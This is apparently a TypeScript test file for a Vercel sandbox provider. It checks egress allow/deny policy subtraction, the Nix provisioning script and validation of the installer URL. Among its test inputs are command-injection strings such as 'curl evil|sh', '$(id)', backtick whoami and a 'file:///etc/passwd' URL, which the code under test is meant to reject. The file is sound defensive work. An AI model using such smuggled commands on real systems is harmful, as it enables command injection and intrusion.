import { afterEach, describe, expect, test } from "bun:test";
import { __testOnly, nixInstallerUrl } from "../runtime/providers/vercel.js";

const { networkPolicyFromDomains, provisionScript } = __testOnly;

describe("vercel networkPolicyFromDomains — deny subtraction", () => {
  test("no denies: wildcard stays allow-all, lists pass through", () => {
    expect(networkPolicyFromDomains(["*"])).toBe("allow-all");
    expect(networkPolicyFromDomains(["api.example.com"])).toEqual({
      allow: ["api.example.com"],
    });
    expect(networkPolicyFromDomains(undefined)).toBe("deny-all");
    expect(networkPolicyFromDomains([])).toBe("deny-all");
  });

  test("allow-all plus a deny fails closed instead of granting everything", () => {
    // The sandbox policy cannot express "everything except evil.com" —
    // an unbounded allow must not survive a configured deny.
    expect(networkPolicyFromDomains(["*"], ["evil.com"])).toBe("deny-all");
  });

  test("denied entry is subtracted from an explicit allow list", () => {
    expect(
      networkPolicyFromDomains(
        ["api.example.com", "evil.com"],
        ["evil.com"]
      )
    ).toEqual({ allow: ["api.example.com"] });
  });

  test("wildcard deny removes covered allow entries", () => {
    expect(
      networkPolicyFromDomains(
        ["api.example.com", "safe.other.com"],
        [".example.com"]
      )
    ).toEqual({ allow: ["safe.other.com"] });
  });

  test("allow wildcard overlapping a deny is dropped (fail closed)", () => {
    expect(
      networkPolicyFromDomains(["*.evil.com", "ok.com"], ["evil.com"])
    ).toEqual({ allow: ["ok.com"] });
  });

  test("all allows denied collapses to deny-all", () => {
    expect(networkPolicyFromDomains(["evil.com"], ["evil.com"])).toBe(
      "deny-all"
    );
  });

  test("port-qualified allow does not dodge a deny on the bare host", () => {
    expect(
      networkPolicyFromDomains(["evil.example.com:443", "ok.com"], ["evil.example.com"])
    ).toEqual({ allow: ["ok.com"] });
  });

  test("deny matching is case-insensitive", () => {
    // DNS is case-insensitive; a mixed-case deny must still subtract.
    expect(
      networkPolicyFromDomains(["*.example.com"], ["SENSITIVE.EXAMPLE.COM"])
    ).toBe("deny-all");
    expect(
      networkPolicyFromDomains(["API.Example.com", "ok.com"], ["api.example.com"])
    ).toEqual({ allow: ["ok.com"] });
  });
});

describe("vercel networkPolicyFromDomains — gateway-derived extra hosts", () => {
  test("adds the substituters to a configured allowlist", () => {
    expect(
      networkPolicyFromDomains(["github.com"], undefined, ["cache.nixos.org"])
    ).toEqual({ allow: ["github.com", "cache.nixos.org"] });
  });

  test("grants the substituters even when the agent has no allowlist of its own", () => {
    // Otherwise an agent whose only tooling is a contributed CLI would get a
    // deny-all sandbox and the install would hang.
    expect(
      networkPolicyFromDomains(undefined, undefined, ["cache.nixos.org"])
    ).toEqual({ allow: ["cache.nixos.org"] });
  });

  test("an explicit deny still subtracts a substituter", () => {
    // No silent exemption: an operator who denies the cache gets no package
    // install rather than an egress hole they did not approve.
    expect(
      networkPolicyFromDomains(["github.com"], ["cache.nixos.org"], [
        "cache.nixos.org",
      ])
    ).toEqual({ allow: ["github.com"] });
  });
});

describe("vercel provisionScript", () => {
  test("installs each package from nixpkgs into the sandbox-local profile", () => {
    const script = provisionScript(["gh", "ripgrep"], "marker123");
    expect(script).toContain("nixpkgs#gh");
    expect(script).toContain("nixpkgs#ripgrep");
    expect(script).toContain(
      'nix profile install --profile "$PROFILE" nixpkgs#gh nixpkgs#ripgrep'
    );
    expect(script).toContain('PROFILE="$NIX_HOME/profiles/marker123"');
    expect(script).toContain('ln -sfn "$PROFILE" "$NIX_HOME/profile"');
  });

  test("checks the actual single-user nix binary before bootstrapping", () => {
    const script = provisionScript(["gh"], "marker123");
    expect(script).toContain('[ ! -x "$NIX_HOME/.nix-profile/bin/nix" ]');
    expect(script).not.toContain("$NIX_HOME/nix/var/nix/profiles/default/bin/nix");
  });

  test("uses an exact hash-addressed profile so removed packages leave PATH", () => {
    const first = provisionScript(["gh"], "set-a");
    const second = provisionScript(["jq"], "set-b");
    expect(first).toContain('PROFILE="$NIX_HOME/profiles/set-a"');
    expect(first).toContain("nixpkgs#gh");
    expect(second).toContain('PROFILE="$NIX_HOME/profiles/set-b"');
    expect(second).toContain("nixpkgs#jq");
    expect(second).not.toContain("nixpkgs#gh");
    expect(second).toContain('ln -sfn "$PROFILE" "$NIX_HOME/profile"');
  });

  test("re-selects an already-built set without touching the network", () => {
    // The profile dir survives in the persistent sandbox even if the marker
    // was clobbered, so PATH can be pointed at it with no substituter access.
    const script = provisionScript(["gh"], "marker123");
    const offline = script
      .split("\n")
      .find(
        (line) =>
          line.startsWith('if [ -d "$PROFILE/bin" ]') &&
          line.includes("lobu-packages: cached")
      );
    expect(offline).toBeDefined();
    expect(script.indexOf('if [ -d "$PROFILE/bin" ]')).toBeLessThan(
      script.indexOf("curl")
    );
  });

  test("deletes a partial profile so a failed attempt cannot poison the retry", () => {
    const script = provisionScript(["gh"], "marker123");
    expect(script).toContain(
      'rm -f "$PROFILE" "$PROFILE"-*-link'
    );
    expect(script).toContain(
      'if ! nix profile install --profile "$PROFILE" nixpkgs#gh; then rm -f "$PROFILE" "$PROFILE"-*-link; exit 1; fi'
    );
  });

  test("short-circuits on a marker match before touching the network", () => {
    // Idempotence lives in the SANDBOX filesystem, not a gateway Map: the pod
    // that provisioned is not the pod that handles the next message.
    const script = provisionScript(["gh"], "marker123");
    const guard = script
      .split("\n")
      .find((line) => line.includes("lobu-packages: cached"));
    expect(guard).toContain("/opt/lobu-nix/.lobu-packages");
    expect(guard).toContain("lobu-packages: cached");
    // The guard must precede the installer download, or the "cached" path still
    // pays the bootstrap.
    expect(script.indexOf("marker123")).toBeLessThan(script.indexOf("curl"));
  });

  test("fails the pipeline instead of trusting the installer's exit code", () => {
    // `curl … | sh` exits 0 on a dead download (sh reads empty stdin), so a
    // failed bootstrap would only surface as a confusing missing-nix.sh error.
    const script = provisionScript(["gh"], "marker123");
    expect(script).toContain("set -o pipefail");
    expect(script.indexOf("set -o pipefail")).toBeLessThan(
      script.indexOf("curl")
    );
  });

  test("sources the third-party profile script without nounset", () => {
    const script = provisionScript(["gh"], "marker123");
    expect(script).toContain(
      'set +u; . "$NIX_HOME/.nix-profile/etc/profile.d/nix.sh"; set -u'
    );
  });

  test("keeps root-written provisioning state out of the agent workspace", () => {
    // Provisioning runs as root while the worker writes /vercel/sandbox
    // unprivileged: a marker or HOME path the worker can swap for a symlink
    // would be followed by root's writes.
    const script = provisionScript(["gh"], "marker123");
    expect(script).toContain("export NIX_HOME=/opt/lobu-nix");
    expect(script).not.toContain("/vercel/sandbox");
  });

  test("refuses to build a command line for an unvalidated package name", () => {
    // Defence in depth: the route already sanitizes, but this string BECOMES a
    // command line, so a caller that forgets must fail loudly, not inject.
    expect(() => provisionScript(["gh", "x; touch /tmp/pwn"], "m")).toThrow();
    expect(() => provisionScript(["$(id)"], "m")).toThrow();
  });
});

describe("nixInstallerUrl", () => {
  const original = process.env.LOBU_NIX_INSTALLER_URL;
  afterEach(() => {
    if (original === undefined) delete process.env.LOBU_NIX_INSTALLER_URL;
    else process.env.LOBU_NIX_INSTALLER_URL = original;
  });

  test("defaults to a version-pinned installer on a substituter host", () => {
    delete process.env.LOBU_NIX_INSTALLER_URL;
    // Pinned (not `nixos.org/nix/install`) so the bootstrap needs no egress
    // grant beyond the substituters the policy already carries.
    expect(nixInstallerUrl()).toBe(
      "https://releases.nixos.org/nix/nix-2.28.4/install"
    );
    expect(nixInstallerUrl()).toStartWith("https://releases.nixos.org/");
  });

  test("accepts a plain https mirror override", () => {
    process.env.LOBU_NIX_INSTALLER_URL = "https://mirror.internal/nix/install";
    expect(nixInstallerUrl()).toBe("https://mirror.internal/nix/install");
  });

  test("falls back to the pinned default for anything shell-significant", () => {
    // The value is interpolated into a shell command.
    for (const bad of [
      "https://x/install; curl evil|sh",
      "https://x/$(id)",
      "https://x/`whoami`",
      "http://x/install",
      "file:///etc/passwd",
      "https://x/install&&id",
    ]) {
      process.env.LOBU_NIX_INSTALLER_URL = bad;
      expect(nixInstallerUrl()).toBe(
        "https://releases.nixos.org/nix/nix-2.28.4/install"
      );
    }
  });
});
